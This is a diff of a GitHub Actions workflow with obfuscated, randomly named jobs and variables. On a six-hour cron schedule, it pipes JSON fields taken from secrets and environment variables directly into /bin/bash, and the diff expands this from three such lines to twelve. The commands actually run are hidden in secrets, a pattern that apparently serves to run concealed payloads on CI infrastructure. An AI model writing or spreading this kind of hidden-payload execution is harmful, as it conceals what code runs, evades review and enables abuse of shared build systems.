@@ -2,9 +2,9 @@ name: dugubu6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 4/6 * * *'
+    - cron: '14 0/6 * * *'
 
-jobs:  # 24748
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,18 @@ jobs:  # 24748
       - uses: actions/checkout@v4
       - name: dugubu6789
         env:
-          myw83708: ${{ secrets.myw83708 }}
+          ldc98: ${{ secrets.ldc98 }}
         run: |
-          echo $myw83708 | jq -r .b80 | /bin/bash
-          echo $lugoh6192 | jq -r .ohijv18026 | /bin/bash
-          echo $tqsa95 | jq -r .ltutn52596 | /bin/bash
+          echo $ldc98 | jq -r .jzbe921 | /bin/bash
+          echo $ec105 | jq -r .t13 | /bin/bash
+          echo $b64 | jq -r .lsl19745 | /bin/bash
+          echo $novw64 | jq -r .y4 | /bin/bash
+          echo $oxks0518 | jq -r .tdcly35716 | /bin/bash
+          echo $af54383 | jq -r .o06413 | /bin/bash
+          echo $tegs7 | jq -r .pk4515 | /bin/bash
+          echo $fb59738 | jq -r .mwjdk0 | /bin/bash
+          echo $xa089 | jq -r .m86 | /bin/bash
+          echo $metvk523 | jq -r .ek20876 | /bin/bash
+          echo $oxnmn0 | jq -r .efs79405 | /bin/bash
+          echo $ivkb462 | jq -r .dn25 | /bin/bash
 
